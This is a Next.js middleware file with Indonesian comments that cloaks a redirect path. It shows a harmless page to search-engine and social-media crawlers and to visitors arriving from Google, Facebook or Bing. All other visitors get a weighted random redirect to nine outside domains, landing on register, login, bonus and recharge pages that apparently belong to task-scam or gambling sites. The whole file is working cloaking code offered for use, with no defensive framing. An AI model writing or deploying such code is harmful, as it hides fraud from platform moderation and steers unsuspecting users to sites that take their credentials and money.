import { NextResponse } from 'next/server';

// ===============================================
// 1. KONFIGURASI KHUSUS ANDA
// ===============================================

// JALUR UTAMA YANG MENGAKTIFKAN PENGALIHAN
const ACTIVE_REDIRECT_PATH = '/validus/'; 

// URL TARGET BERBOBOT (Weighted Targets) - Total harus 100
// Prioritas Berdasarkan Urutan: Ventureidven (20%) hingga Gdpventureid (10%)
const TARGET_URLS_WEIGHTED = [
    // [Domain Dasar, Bobot/Prioritas]
    ["https://ventureidven.com", 40],  
    ["https://platformtugas.com", 15],   
    ["https://akunfinansial.com", 11],
    ["https://akuntugaslogin.com", 9],
    ["https://akunpg.com", 7],
    ["https://akunkeanggotaan6.com", 6],
    ["https://digitaldayatekno.vip", 5],
    ["https://orange168.com", 5],
    ["https://gdpventureid.com", 2]
];

// USER AGENT BOT/CRAWLER
const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];
const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];


// ===============================================
// FUNGSI UTAMA MIDDLEWARE
// ===============================================

export default function middleware(request) {
    const url = new URL(request.url);
    const pathname = url.pathname.toLowerCase();
    const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
    const referer = request.headers.get('referer')?.toLowerCase() || '';

    let isBot = false;
    // Pengecekan Bot
    for (const bot of BOT_AGENTS) {
        if (userAgent.includes(bot)) { isBot = true; break; }
    }
    for (const ref of SUSPICIOUS_REFERERS) {
        if (referer.includes(ref)) { isBot = true; break; }
    }

    // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
    if (!isBot) { 
        // Logika redirect berbobot Anda
        const totalWeight = TARGET_URLS_WEIGHTED.reduce((sum, item) => sum + item[1], 0);
        let randomValue = Math.random() * totalWeight;
        let randomBaseDomain = '';

        for (const [domain, weight] of TARGET_URLS_WEIGHTED) {
            randomValue -= weight;
            if (randomValue <= 0) {
                randomBaseDomain = domain;
                break;
            }
        }

        // 2. Ambil Sisa Path TEPAT setelah '/validus'
        // Kita menggunakan (ACTIVE_REDIRECT_PATH.length - 1) untuk memastikan kita mendapatkan path yang benar.
        let remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length - 1); 
        let targetPath = '/'; 

        // 3. Mapping Path
        if (remainingPath.includes('daftar')) {
            targetPath = '/index/user/register';
        } else if (remainingPath.includes('home')) {
            targetPath = '/index/my/index';
        } else if (remainingPath.includes('login')) {
            targetPath = '/index/user/login';
        } 
        else if (remainingPath.includes('bonus')) { 
            targetPath = '/index/promo/bonus'; 
        }
        // Mapping Baru
        else if (remainingPath.includes('recharge')) {
            targetPath = '/index/ctrl/recharge'; 
        }
        else {
            targetPath = '/';
        } 
        
        const finalRedirectUrl = randomBaseDomain + targetPath;

        return NextResponse.redirect(finalRedirectUrl, 302);
    } 
    
    // KONDISI 2: JIKA BOT (SCRAPER) TERDETEKSI
    // Rewrite ke root path, yang akan me-render app/page.js (Halaman Aman)
    return NextResponse.rewrite(new URL('/', url)); 
}

// Konfigurasi: Middleware HANYA berjalan pada path yang mengandung /validus/
// Ini memastikan root path (https://aksesmembership.vercel.app/) berjalan normal
export const config = {
    matcher: ['/validus/:path*'],
};
